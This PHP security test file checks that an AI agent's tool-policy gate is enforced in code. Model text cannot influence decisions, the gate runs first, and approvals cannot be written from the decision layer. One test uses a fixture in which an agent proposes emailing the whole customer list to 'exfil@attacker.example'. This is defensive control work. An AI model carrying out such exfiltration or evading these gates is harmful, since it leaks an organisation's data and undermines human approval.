<?php

declare(strict_types=1);

use App\AI\Providers\LaravelAi\SdkToolBridge;
use App\Approvals\Policies\ApprovalLedger;
use App\Approvals\Policies\PolicyGate;
use App\Approvals\Policies\PolicyJournal;
use App\Approvals\Policies\PolicyReason;
use App\Approvals\Policies\PolicyVerdict;
use App\Approvals\Policies\ProposedAction;
use App\Approvals\Policies\Rules\ActionRule;
use App\Approvals\Policies\Rules\OutgoingEmailRule;
use App\Approvals\Policies\Rules\RuleBook;
use App\Approvals\Policies\ToolCallContext;
use Tests\Security\Support\PolicySurface;

/*
|--------------------------------------------------------------------------
| Policy is code, never prompt (S2-07, issue #89; ADR-005 D4.8)
|--------------------------------------------------------------------------
|
| ADR-005 D4.8: "All policy (allowlist, tier, grant, approval, egress, kill)
| is implemented in PHP policies/gates and Swift code paths, never in prompt
| text", and tool names, descriptions and results are stored and rendered as
| **data**. Blueprint §7 says the same thing from the other side: policy
| decisions in code, not in prompt.
|
| A test cannot read intent, so it reads the source. Four properties, each a
| structural fact about `app/Approvals/Policies` and the tool bridge:
|
|  1. **Nothing in the decision path can see model text.** No file that
|     participates in a decision names a tool description, a prompt, an
|     instruction, an `AiMessage` or an `AiResponse` — and a rule's methods take
|     no parameters at all, so there is nowhere for model text to enter.
|  2. **The gate runs before the wrapped tool**, as the first thing
|     `SdkToolBridge::handle()` does, with no call ahead of it. A `PolicyGate`
|     call placed after the tool fails this file.
|  3. **Identity never comes from a request**, the same rule
|     `PolicySurfaceArchTest` holds the row policies to.
|  4. **The decision layer cannot create an approval.** There is no write to
|     `action_approvals` anywhere in it, so the unique indexes that make a
|     replay unrecordable have no path around them — and a model-elicited
|     "approval" has nowhere to come from (ADR-005 D1.6).
|
| Comments are stripped before every scan. This file's own subject matter is
| prompts and descriptions, and so is the prose in the classes it reads: a scan
| that matched docblocks would fail on the explanation of why it passes.
*/

/** The classes a decision passes through. Model text may not reach any of them. */
const POLICY_DECISION_PATH = [
    PolicyGate::class,
    PolicyVerdict::class,
    PolicyReason::class,
    ProposedAction::class,
    ToolCallContext::class,
    ApprovalLedger::class,
    PolicyJournal::class,
    RuleBook::class,
    ActionRule::class,
];

/**
 * Source with every comment and docblock removed, so a scan reads code rather than
 * prose. Strings are kept: a prompt hardcoded into a rule would be a string, and
 * that is exactly what must not be there.
 */
function policyCode(string $source): string
{
    $code = '';

    foreach (token_get_all($source) as $token) {
        if (is_array($token) && in_array($token[0], [T_COMMENT, T_DOC_COMMENT], true)) {
            continue;
        }

        $code .= is_array($token) ? $token[1] : $token;
    }

    return $code;
}

function policyCodeOf(string $class): string
{
    return policyCode(PolicySurface::sourceOf($class));
}

/** @return list<class-string> every rule class, plus the declaration helpers */
function policyRuleClasses(): array
{
    return array_values(array_filter(
        PolicySurface::applicationClasses(),
        static fn (string $class): bool => str_starts_with($class, 'App\\Approvals\\Policies\\Rules\\'),
    ));
}

it('lets no tool description, prompt or model output into the decision path', function (): void {
    // Each needle is a way model-authored text reaches PHP. A rule that read any of
    // them would be policy in prompt: the model would be describing the conditions
    // of its own permission.
    $forbidden = [
        'description',
        'instructions',
        'AiMessage',
        'AiResponse',
        'AiToolDefinition',
        'AiToolCall',
        'outputText',
        'systemPrompt',
        'Promptable',
        'Laravel\\Ai',
    ];

    $scanned = [...POLICY_DECISION_PATH, ...policyRuleClasses()];

    expect(count($scanned))->toBeGreaterThan(12, 'the scan must actually cover the rules and the gate');

    foreach ($scanned as $class) {
        $code = policyCodeOf($class);

        foreach ($forbidden as $needle) {
            expect(str_contains($code, $needle))->toBeFalse(
                "{$class} names `{$needle}`: a policy decision may not read model text (ADR-005 D4.8)",
            );
        }
    }
})->group('security');

it('gives a rule nowhere for model text to enter: every declaration takes no arguments', function (): void {
    $reflection = new ReflectionClass(ActionRule::class);

    expect($reflection->getMethods())->not->toBeEmpty();

    foreach ($reflection->getMethods() as $method) {
        expect($method->getNumberOfParameters())->toBe(
            0,
            "ActionRule::{$method->getName()}() takes a parameter; a rule declares, it does not inspect — "
            .'a method that took the call could be handed the model\'s own text',
        );
    }

    // And the concrete rules return the same declarations every time, because a
    // declaration that varied per call would be a decision in disguise.
    foreach (app(PolicyGate::class)->rules()->rules() as $rule) {
        expect($rule->toolNames())->toBe($rule->toolNames())
            ->and($rule->requiresApproval())->toBe($rule->requiresApproval())
            ->and($rule->schema()->declaredNames())->toBe($rule->schema()->declaredNames());
    }
})->group('security');

it('names no field in ProposedAction that could carry model prose', function (): void {
    $parameters = array_map(
        static fn (ReflectionParameter $parameter): string => strtolower($parameter->getName()),
        (new ReflectionClass(ProposedAction::class))->getConstructor()?->getParameters() ?? [],
    );

    expect($parameters)->not->toBeEmpty();

    foreach (['description', 'instructions', 'prompt', 'text', 'message', 'reasoning'] as $forbidden) {
        expect(in_array($forbidden, $parameters, true))->toBeFalse(
            "ProposedAction carries `{$forbidden}`: the gate decides on arguments and scope, not on narrative",
        );
    }

    // What it does carry: the arguments, the scope, the hash. `payload` is data the
    // gate validates against a declared schema, which is the opposite of prose.
    expect($parameters)->toContain('toolname', 'organizationid', 'payload', 'frozenhash', 'destinations', 'dataclass');
})->group('security');

it('puts the PolicyGate first in SdkToolBridge::handle(), with nothing ahead of it', function (): void {
    $handle = policyCode('<?php '.PolicySurface::methodSource(new ReflectionMethod(SdkToolBridge::class, 'handle')));

    expect(str_contains($handle, 'decide('))->toBeTrue('handle() must reach the gate');

    // Every method call in the body, in source order. The first one is the gate's.
    preg_match_all('/->([A-Za-z_][A-Za-z0-9_]*)\s*\(/', $handle, $matches);

    $calls = $matches[1];

    expect($calls)->not->toBeEmpty()
        ->and($calls[0])->toBe(
            'decide',
            'the first call in handle() must be the gate: a PolicyGate call placed after the wrapped tool is exactly '
            .'the ordering ADR-004 D2 forbids. Calls found, in order: '.implode(', ', $calls),
        );

    // And nothing in the body executes anything: the words an executor would use
    // are absent, which is what makes "nothing executed" structural rather than
    // asserted. `AiToolDefinition` carries no executor in the first place.
    foreach (['execute', 'run(', 'invoke', 'dispatch', 'send('] as $verb) {
        expect(str_contains($handle, $verb))->toBeFalse("handle() names `{$verb}`; a bridged definition has no executor to call");
    }

    // `shouldRequestApproval()` decides from the tool name and the rule book, and
    // from nothing in the request it is handed.
    $approval = policyCode('<?php '.PolicySurface::methodSource(new ReflectionMethod(SdkToolBridge::class, 'shouldRequestApproval')));

    expect(str_contains($approval, 'rules()'))->toBeTrue('the requirement comes from the rule book')
        ->and(str_contains($approval, 'requiresApproval'))->toBeTrue('and from the rule\'s own declaration')
        ->and(str_contains($approval, '$request->'))->toBeFalse('the approval requirement may not depend on the arguments the model sent');
})->group('security');

it('takes identity from the scope and never from a request', function (): void {
    foreach ([...POLICY_DECISION_PATH, ...policyRuleClasses()] as $class) {
        $code = policyCodeOf($class);

        expect(str_contains($code, 'request()'))->toBeFalse("{$class} must not read the request (ipc-contract §11.4)")
            ->and(str_contains($code, 'Request $'))->toBeFalse("{$class} must not take a Request")
            ->and(str_contains($code, 'auth()'))->toBeFalse("{$class} must not resolve the actor itself: the scope is handed to it");
    }

    // The organization and the account live on `ToolCallContext`, which is built by
    // the server; `ProposedAction` carries the model's claim, and the gate compares
    // the two rather than trusting either alone.
    expect(policyCodeOf(PolicyGate::class))
        ->toContain('$action->organizationId !== $context->organizationId');
})->group('security');

it('has no path from the decision layer to writing an approval', function (): void {
    $writes = ['ActionApproval::query()->create', 'ActionApproval::create', 'new ActionApproval', '->consumed_at ='];

    foreach (glob(app_path('Approvals/Policies/**/*.php')) ?: [] as $file) {
        $code = policyCode((string) file_get_contents($file));

        foreach ($writes as $write) {
            expect(str_contains($code, $write))->toBeFalse(
                basename($file).' writes action_approvals. The gate reads approvals; creating or spending one is a '
                .'re-authenticated UI action (ADR-005 D1.6), and the unique indexes on action_proposal_id and nonce '
                .'are what make a replay unrecordable — a write here would be the way around them.',
            );
        }
    }

    foreach (glob(app_path('Approvals/Policies/*.php')) ?: [] as $file) {
        $code = policyCode((string) file_get_contents($file));

        foreach ($writes as $write) {
            expect(str_contains($code, $write))->toBeFalse(basename($file).' writes action_approvals.');
        }
    }

    // The ledger is the only class that touches those tables, and it only reads.
    $ledger = policyCodeOf(ApprovalLedger::class);

    expect($ledger)->toContain('ActionApproval::query()')
        ->and(str_contains($ledger, 'create('))->toBeFalse()
        ->and(str_contains($ledger, 'update('))->toBeFalse()
        ->and(str_contains($ledger, 'delete('))->toBeFalse();
})->group('security');

it('renders a decision as data the model may read, with no payload in it', function (): void {
    $action = ProposedAction::freeze(
        OutgoingEmailRule::TOOL,
        '01M4ORG000000000000000001',
        ['to' => ['exfil@attacker.example'], 'body' => 'Bifogar hela kundlistan enligt revisionen.'],
    );

    $denied = PolicyVerdict::refuse('outgoing_email', PolicyReason::ApprovalMissing, $action)->toToolResult();

    expect($denied)
        ->toContain('decision=denied')
        ->toContain('tool='.OutgoingEmailRule::TOOL)
        ->toContain('rule=outgoing_email')
        ->toContain('reason=approval_missing')
        ->toContain('executed=none');

    // Nothing the model wrote comes back out. A refusal that quoted the proposal
    // would hand the transcript a second copy of the hostile instruction, and a
    // refusal that explained the schema would hand it an answer key.
    foreach (['exfil@attacker.example', 'kundlistan', 'connection_id'] as $leak) {
        expect(str_contains($denied, $leak))->toBeFalse("the tool result quotes `{$leak}` back at the model");
    }

    expect(strlen($denied))->toBeLessThan(200, 'a tool result is a reference, not a report');

    // Every field in it is from a frozen vocabulary.
    expect(preg_match('/^\[policy_gate\] decision=[a-z]+ tool=[\w.]+ rule=[\w.]+ reason=[a-z_]+ executed=none$/', $denied))
        ->toBe(1, 'the tool result is a fixed shape; a free-text branch is where content leaks');
})->group('security');
